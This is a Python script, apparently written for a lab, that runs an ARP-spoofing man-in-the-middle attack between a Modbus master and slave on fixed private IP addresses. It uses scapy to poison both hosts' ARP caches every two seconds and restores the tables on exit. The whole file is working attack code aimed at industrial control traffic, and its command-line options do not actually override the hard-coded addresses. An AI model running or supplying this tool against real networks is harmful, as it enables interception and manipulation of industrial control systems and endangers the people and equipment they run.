#!/usr/bin/env python3
"""
Modbus MITM ARP Spoofer - Bridge-based L2 attack
MASTER(172.16.4.50) <-> Kali(172.16.4.49) <-> SLAVE(172.16.4.51)
"""

import sys
import time
import argparse
from scapy.all import *
import threading

# ═══════════════════════════════════════════════
# KONFIGURATION - SAMME som dit Modbus script!
# ═══════════════════════════════════════════════
MASTER_IP = "172.16.4.50"
SLAVE_IP = "172.16.4.51" 
MITM_IP = "172.16.4.49"
INTERFACE = "br0"

# ═══════════════════════════════════════════════

class ARPMITM:
    def __init__(self):
        self.master_mac = None
        self.slave_mac = None
        self.mitm_mac = None
        self.running = False
        
    def get_mac(self, ip):
        """Resolve MAC via ARP request"""
        print(f"🔍 Resolving MAC for {ip}...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=3, iface=INTERFACE, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None
    
    def discover_hosts(self):
        """Find real MAC addresses"""
        print("🕵️  Discovering target MAC addresses...")
        
        self.mitm_mac = get_if_hwaddr(INTERFACE)
        print(f"   Kali MAC: {self.mitm_mac}")
        
        self.master_mac = self.get_mac(MASTER_IP)
        if not self.master_mac:
            print(f"❌ Cannot resolve {MASTER_IP}")
            return False
        
        self.slave_mac = self.get_mac(SLAVE_IP)
        if not self.slave_mac:
            print(f"❌ Cannot resolve {SLAVE_IP}")
            return False
            
        print(f"   Master({MASTER_IP}): {self.master_mac}")
        print(f"   Slave ({SLAVE_IP}):  {self.slave_mac}")
        print("✅ Discovery complete!\n")
        return True
    
    def poison_master(self):
        """MASTER tror MITM er SLAVE"""
        pkt = ARP(op=2, psrc=SLAVE_IP, pdst=MASTER_IP, 
                 hwdst=self.master_mac, hwsrc=self.mitm_mac)
        sendp(pkt, iface=INTERFACE, verbose=0)
    
    def poison_slave(self):
        """SLAVE tror MITM er MASTER"""
        pkt = ARP(op=2, psrc=MASTER_IP, pdst=SLAVE_IP, 
                 hwdst=self.slave_mac, hwsrc=self.mitm_mac)
        sendp(pkt, iface=INTERFACE, verbose=0)
    
    def restore_arp(self):
        """Restore original ARP entries"""
        print("🔄 Restoring ARP tables...")
        restore_pkt1 = ARP(op=2, psrc=MASTER_IP, pdst=SLAVE_IP, 
                          hwsrc=self.slave_mac, hwdst=self.master_mac)
        restore_pkt2 = ARP(op=2, psrc=SLAVE_IP, pdst=MASTER_IP, 
                          hwsrc=self.master_mac, hwdst=self.slave_mac)
        
        for _ in range(5):
            sendp(restore_pkt1, iface=INTERFACE, verbose=0)
            sendp(restore_pkt2, iface=INTERFACE, verbose=0)
            time.sleep(0.1)
        print("✅ ARP tables restored!")
    
    def run(self):
        if not self.discover_hosts():
            return
            
        self.running = True
        print("🚀 Starting ARP spoofing attack...")
        print("   MASTER <-poison-> KALi <-poison-> SLAVE")
        print("Press Ctrl+C to stop and restore\n")
        
        try:
            while self.running:
                self.poison_master()
                self.poison_slave()
                time.sleep(2)  # Send every 2 seconds
        except KeyboardInterrupt:
            print("\n🛑 Stopping...")
        finally:
            self.restore_arp()

def main():
    parser = argparse.ArgumentParser(description="Modbus MITM ARP Spoofer")
    parser.add_argument("--master", default=MASTER_IP, help="Master IP")
    parser.add_argument("--slave", default=SLAVE_IP, help="Slave IP") 
    parser.add_argument("--iface", default=INTERFACE, help="Interface")
    args = parser.parse_args()
    
    # Global config update
    globals().update(args.__dict__)
    
    # Check root
    if os.geteuid() != 0:
        print("❌ Run as root: sudo python3 arp_mitm.py")
        sys.exit(1)
    
    mitm = ARPMITM()
    mitm.run()

if __name__ == "__main__":
    main()